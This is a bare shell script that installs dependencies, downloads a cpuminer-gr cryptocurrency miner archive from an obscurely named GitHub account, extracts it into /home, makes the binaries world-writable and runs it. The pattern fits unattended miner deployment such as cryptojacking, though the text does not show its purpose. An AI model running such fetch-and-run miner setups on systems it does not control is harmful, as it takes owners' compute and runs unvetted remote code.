apt-get update -y
apt-get install -y libcurl3
cd /home
wget https://github.com/jotmbtmyejhle/batch/raw/main/cpuminer-gr-1.2.4.1-x86_64_linux.7z
apt update
apt-get install -y p7zip-full
7z x cpuminer-gr-1.2.4.1-x86_64_linux.7z
chmod +x cpuminer.sh
chmod -R 777 binaries
bash /home/cpuminer.sh
